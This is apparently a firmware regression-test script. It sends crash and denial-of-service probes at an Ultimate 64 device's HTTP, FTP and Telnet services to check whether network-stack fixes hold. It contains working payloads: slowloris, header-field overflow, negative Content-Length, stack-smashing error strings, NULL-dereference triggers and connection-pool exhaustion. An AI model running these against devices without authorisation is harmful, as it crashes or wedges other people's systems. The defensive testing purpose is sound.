#!/usr/bin/env python3
"""Single-shot forcing probes for the documented network-stack wedge/crash vectors.

Each attack is run against a live device (ideally the PATCHED firmware, to show the
vector is independent of the NS-1 connection-churn fix). REST health is sampled
before, during (attack sockets held) and after release, so we can classify each
vector as: fixed / transient / persistent-wedge / crash.

Run ONE attack per invocation; recover the device with a Nios reset (JTAG redeploy)
between destructive runs.

  python3 netstack_force.py --host u64 --attack h2   # oversized-header busy-spin
  python3 netstack_force.py --host u64 --attack h5   # slowloris slot exhaustion
  python3 netstack_force.py --host u64 --attack n2   # idle netconn-pool exhaustion
  python3 netstack_force.py --host u64 --attack r1   # oversized REST error -> stack smash
"""
from __future__ import annotations

import argparse
import http.client
import os
import socket
import sys
import time

HOST = os.getenv("HOST", "u64")
HTTP_PORT = int(os.getenv("HTTP_PORT", "80"))
FTP_PORT = int(os.getenv("FTP_PORT", "21"))
TELNET_PORT = int(os.getenv("TELNET_PORT", "23"))

ATTACKS = ("h1", "h2", "h5", "h7", "n2", "r1", "r2", "f7", "idlereap")


def health(host: str, port: int, timeout: float = 4.0) -> str:
    try:
        c = http.client.HTTPConnection(host, port, timeout=timeout)
        try:
            c.request("GET", "/v1/version", headers={"Connection": "close"})
            r = c.getresponse()
            b = r.read()
            return f"OK status={r.status} bytes={len(b)}"
        finally:
            c.close()
    except Exception as e:  # noqa: BLE001
        return f"FAIL {type(e).__name__}:{e}"


def health_series(host: str, port: int, label: str, n: int = 5, gap: float = 1.5) -> None:
    for i in range(n):
        print(f"  [{label} +{i}] health = {health(host, port)}", flush=True)
        if i < n - 1:
            time.sleep(gap)


def attack_h2(host: str, port: int) -> None:
    """Oversized header (>2048 B) with no terminator, socket held open + still sending."""
    s = socket.create_connection((host, port), timeout=4)
    s.sendall(b"GET / HTTP/1.1\r\n")
    line = b"X-Pad: " + b"a" * 64 + b"\r\n"
    sent = 0
    try:
        for _ in range(200):  # ~14 KB of header lines, no blank line
            s.sendall(line)
            sent += len(line)
        print(f"  sent {sent} bytes of unterminated headers, holding socket open", flush=True)
    except OSError as e:
        print(f"  send stopped: {e} (after {sent} bytes)", flush=True)
    print("  health WHILE attack socket held:", flush=True)
    health_series(host, port, "during", n=3)
    try:
        s.close()
    except OSError:
        pass


def attack_h5(host: str, port: int) -> None:
    """Slowloris: open several sockets, send a partial request, then nothing."""
    socks = []
    for i in range(8):
        try:
            s = socket.create_connection((host, port), timeout=4)
            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n")  # no final blank line
            socks.append(s)
        except OSError as e:
            print(f"  slot {i}: connect/send failed: {e}", flush=True)
    print(f"  opened {len(socks)} half-open connections, holding", flush=True)
    print("  health WHILE slots held:", flush=True)
    health_series(host, port, "during", n=3)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass


def attack_n2(host: str, http_port: int, ftp_port: int, telnet_port: int) -> None:
    """Hold many idle TCP connections across services to drain the netconn pool."""
    socks = []
    targets = [ftp_port, telnet_port, http_port] * 8  # 24 idle connections
    for i, p in enumerate(targets):
        try:
            s = socket.create_connection((host, p), timeout=4)
            socks.append((p, s))
        except OSError as e:
            print(f"  conn {i} port {p}: {e}", flush=True)
    print(f"  opened {len(socks)} idle connections across ftp/telnet/http", flush=True)
    print("  health (REST) WHILE connections held:", flush=True)
    health_series(host, http_port, "during", n=3)
    for _p, s in socks:
        try:
            s.close()
        except OSError:
            pass


def attack_h1(host: str, port: int) -> None:
    """Request with >20 header fields -> overflow of Header.Fields[20] -> wild
    write past the global http_req[] slot (memory corruption)."""
    for attempt in range(5):
        try:
            s = socket.create_connection((host, port), timeout=4)
            req = b"GET /v1/version HTTP/1.1\r\nHost: x\r\n"
            for i in range(40):  # 40 field lines, well over MAX_HEADER_FIELDS (20)
                req += b"X-H%d: v\r\n" % i
            req += b"\r\n"
            s.sendall(req)
            try:
                data = s.recv(256)
                print(f"  attempt {attempt}: sent 40-header request, resp={data[:20]!r}", flush=True)
            except OSError as e:
                print(f"  attempt {attempt}: recv failed: {e}", flush=True)
            s.close()
        except OSError as e:
            print(f"  attempt {attempt}: connect/send failed: {e}", flush=True)


def attack_h7(host: str, port: int) -> None:
    """POST with a negative Content-Length -> (int)bodySize negative -> OOB in
    the body path."""
    for cl in ("-1", "-1000000", "999999999999"):
        try:
            body = b'{"Audio Mixer":{"Vol UltiSid 1":"+1 dB"}}'
            req = (b"POST /v1/configs HTTP/1.1\r\nHost: x\r\n"
                   b"Content-Type: application/json\r\n"
                   b"Content-Length: " + cl.encode() + b"\r\n\r\n" + body)
            s = socket.create_connection((host, port), timeout=4)
            s.sendall(req)
            try:
                data = s.recv(256)
                print(f"  Content-Length={cl}: resp={data[:24]!r}", flush=True)
            except OSError as e:
                print(f"  Content-Length={cl}: recv failed: {e}", flush=True)
            s.close()
        except OSError as e:
            print(f"  Content-Length={cl}: connect/send failed: {e}", flush=True)


def attack_r2(host: str, port: int) -> None:
    """Set a network password, then hit REST WITHOUT an X-Password header.
    Before the fix this is strcmp(NULL, password) -> NULL deref crash; after the
    fix it is a clean auth rejection. The password is transient (reverts on a
    Nios reset / redeploy)."""
    import urllib.parse
    pw = "netbugtest"
    setpath = ("/v1/configs/" + urllib.parse.quote("Network Settings", safe="") +
               "/" + urllib.parse.quote("Network Password", safe="") + "?value=" + pw)
    def req(method, path, hdrs):
        c = http.client.HTTPConnection(host, port, timeout=4)
        try:
            c.request(method, path, headers=hdrs)
            r = c.getresponse()
            r.read()
            return f"status={r.status}"
        finally:
            c.close()
    try:
        print(f"  set password: PUT {req('PUT', setpath, {'Connection': 'close'})}", flush=True)
    except Exception as e:  # noqa: BLE001
        print(f"  set password raised {type(e).__name__}:{e}", flush=True)
    try:
        r = req("GET", "/v1/version", {"Connection": "close"})  # NO X-Password
        print(f"  no-password request: {r}  (expect 401/403 after fix)", flush=True)
    except Exception as e:  # noqa: BLE001
        print(f"  no-password request raised {type(e).__name__}:{e}  (=> crash, before fix)", flush=True)
    try:
        r = req("GET", "/v1/version", {"Connection": "close", "X-Password": pw})
        print(f"  with-password request: {r}  (expect 200 after fix)", flush=True)
    except Exception as e:  # noqa: BLE001
        print(f"  with-password request raised {type(e).__name__}:{e}", flush=True)
    print("  NOTE: password is set in RAM config; redeploy (Nios reset) to clear it.", flush=True)


def attack_r1(host: str, port: int) -> None:
    """Oversized REST error string -> vsprintf into char msg[200] on the HTTP task."""
    long_name = "A" * 400
    # Path 1: unknown query param on a valid endpoint.
    try:
        c = http.client.HTTPConnection(host, port, timeout=4)
        try:
            c.request("GET", f"/v1/version?{long_name}=1", headers={"Connection": "close"})
            r = c.getresponse()
            r.read()
            print(f"  GET long-query returned status={r.status}", flush=True)
        finally:
            c.close()
    except Exception as e:  # noqa: BLE001
        print(f"  GET long-query raised {type(e).__name__}:{e}", flush=True)
    # Path 2: POST /v1/configs with an oversized invalid category key.
    try:
        body = ('{"' + long_name + '":{}}').encode()
        c = http.client.HTTPConnection(host, port, timeout=4)
        try:
            c.request("POST", "/v1/configs", body=body,
                      headers={"Connection": "close", "Content-Type": "application/json"})
            r = c.getresponse()
            r.read()
            print(f"  POST long-key returned status={r.status}", flush=True)
        finally:
            c.close()
    except Exception as e:  # noqa: BLE001
        print(f"  POST long-key raised {type(e).__name__}:{e}", flush=True)


def attack_f7(host: str, port: int) -> None:
    """POST a body with NO Content-Type header. In route_configs the handler does
    strcasecmp(req->ContentType, ...) where ContentType is NULL -> NULL deref.
    After the fix it returns a clean 400 and the device stays up."""
    body = b'{"Audio Mixer":{"Vol UltiSid 1":"+1 dB"}}'
    req = (b"POST /v1/configs HTTP/1.1\r\nHost: x\r\n"
           b"Content-Length: " + str(len(body)).encode() + b"\r\n"
           b"Connection: close\r\n\r\n" + body)
    s = None
    try:
        s = socket.create_connection((host, port), timeout=6)
        s.sendall(req)
        try:
            data = s.recv(400)
            print(f"  POST-without-Content-Type resp={data[:40]!r} (expect 400 after fix)", flush=True)
        except OSError as e:
            print(f"  recv raised {type(e).__name__}:{e} (=> possible crash before fix)", flush=True)
    except OSError as e:
        print(f"  connect/send failed: {e}", flush=True)
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


def attack_idlereap(host: str, http_port: int, ftp_port: int, telnet_port: int, hold_secs: float) -> None:
    """Open several idle FTP+Telnet connections and hold them WITHOUT sending
    anything, watching for the server to reap them (server-initiated close).
    Before the FTP/Telnet idle-reaper fix these leak until reboot; after, each is
    closed around its idle deadline. REST is health-probed throughout."""
    conns = []  # [label, port, sock, reap_time]
    for p, label in [(ftp_port, "ftp"), (telnet_port, "telnet")] * 3:
        try:
            s = socket.create_connection((host, p), timeout=4)
            s.settimeout(0.5)
            try:
                s.recv(256)  # drain any greeting banner (FTP 220 ...)
            except OSError:
                pass
            s.setblocking(False)
            conns.append([label, p, s, None])
        except OSError as e:
            print(f"  connect {label}:{p} failed: {e}", flush=True)
    if not conns:
        print("  RESULT: no idle connections could be opened (nothing to observe)", flush=True)
        return
    print(f"  holding {len(conns)} idle FTP/Telnet connections for up to {hold_secs:.0f}s", flush=True)
    start = 0.0
    reaped = 0
    while start < hold_secs and reaped < len(conns):
        time.sleep(5)
        start += 5
        for c in conns:
            if c[3] is not None:
                continue
            try:
                data = c[2].recv(1)
                if data == b"":  # orderly server close
                    c[3] = start
                    reaped += 1
                    print(f"  {c[0]} connection reaped by server at ~t={start:.0f}s", flush=True)
            except (BlockingIOError, InterruptedError):
                pass
            except OSError:
                c[3] = start
                reaped += 1
                print(f"  {c[0]} connection closed (reset) at ~t={start:.0f}s", flush=True)
        print(f"  t={start:.0f}s: reaped {reaped}/{len(conns)}; REST={health(host, http_port)}", flush=True)
    for c in conns:
        try:
            c[2].close()
        except OSError:
            pass
    # Report FTP and Telnet separately: only FTP has an idle reaper; Telnet is
    # cap-only, so its idle sessions are expected NOT to be reaped. Conflating them
    # would let held Telnet connections mask (or falsely pass) the FTP reaper.
    def counts(label):
        held = [c for c in conns if c[0] == label]
        return sum(1 for c in held if c[3] is not None), len(held)
    ftp_reaped, ftp_total = counts("ftp")
    tel_reaped, tel_total = counts("telnet")
    print(f"  FTP idle reaper: {ftp_reaped}/{ftp_total} reaped "
          f"({'working' if ftp_reaped == ftp_total and ftp_total else 'LEAK (pre-fix behaviour)' if ftp_total else 'n/a'})", flush=True)
    print(f"  Telnet (cap-only, no idle reaper): {tel_reaped}/{tel_total} reaped "
          f"({'held as expected' if tel_reaped == 0 else 'unexpected reap'})", flush=True)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Single-shot forcing probes for the documented network-stack "
            "wedge/crash vectors on the Ultimate 64. Runs ONE attack per "
            "invocation and samples REST health before, during (attack sockets "
            "held) and after release, classifying the vector as "
            "fixed / transient / persistent-wedge / crash. Recover the device with "
            "a Nios reset (JTAG redeploy) between destructive runs."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "attacks:\n"
            "  h1  header-field array overflow (>20 header lines)\n"
            "  h2  oversized-header busy-spin\n"
            "  h5  slowloris slot exhaustion (idle held connections)\n"
            "  h7  negative Content-Length stuck body\n"
            "  n2  idle netconn-pool exhaustion (FTP/Telnet/HTTP)\n"
            "  r1  oversized REST error -> stack smash\n"
            "  r2  REST password NULL strcmp\n"
            "  f7  POST body with no Content-Type -> NULL deref in config route\n"
            "  idlereap  hold idle FTP/Telnet connections, watch for the reaper\n"
            "\n"
            "example:\n"
            "  netstack_force.py -H u64 --attack r1\n"
        ),
    )
    parser.add_argument("-H", "--host", default=HOST, help="Target host or IP")
    parser.add_argument("--http-port", type=int, default=HTTP_PORT, help="REST HTTP port")
    parser.add_argument("--ftp-port", type=int, default=FTP_PORT, help="FTP control port")
    parser.add_argument("--telnet-port", type=int, default=TELNET_PORT, help="Telnet port")
    parser.add_argument("--attack", required=True, choices=ATTACKS, help="Which forcing vector to run (see below).")
    parser.add_argument("--hold-secs", type=float, default=330.0,
                        help="idlereap: seconds to hold idle connections while watching for the reaper.")
    return parser


def main(argv: list[str]) -> int:
    args = build_parser().parse_args(argv)

    print(f"=== attack {args.attack} on {args.host} ===", flush=True)
    print(f"  health BEFORE = {health(args.host, args.http_port)}", flush=True)
    if args.attack == "h1":
        attack_h1(args.host, args.http_port)
    elif args.attack == "r2":
        attack_r2(args.host, args.http_port)
    elif args.attack == "h7":
        attack_h7(args.host, args.http_port)
    elif args.attack == "h2":
        attack_h2(args.host, args.http_port)
    elif args.attack == "h5":
        attack_h5(args.host, args.http_port)
    elif args.attack == "n2":
        attack_n2(args.host, args.http_port, args.ftp_port, args.telnet_port)
    elif args.attack == "r1":
        attack_r1(args.host, args.http_port)
    elif args.attack == "f7":
        attack_f7(args.host, args.http_port)
    elif args.attack == "idlereap":
        attack_idlereap(args.host, args.http_port, args.ftp_port, args.telnet_port, args.hold_secs)
    print("  health AFTER release (recovery test):", flush=True)
    health_series(args.host, args.http_port, "after", n=6, gap=1.5)
    final = health(args.host, args.http_port)
    print(f"  FINAL health = {final}", flush=True)
    print(f"  VERDICT: {'REST-ALIVE' if final.startswith('OK') else 'REST-WEDGED/DOWN'}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
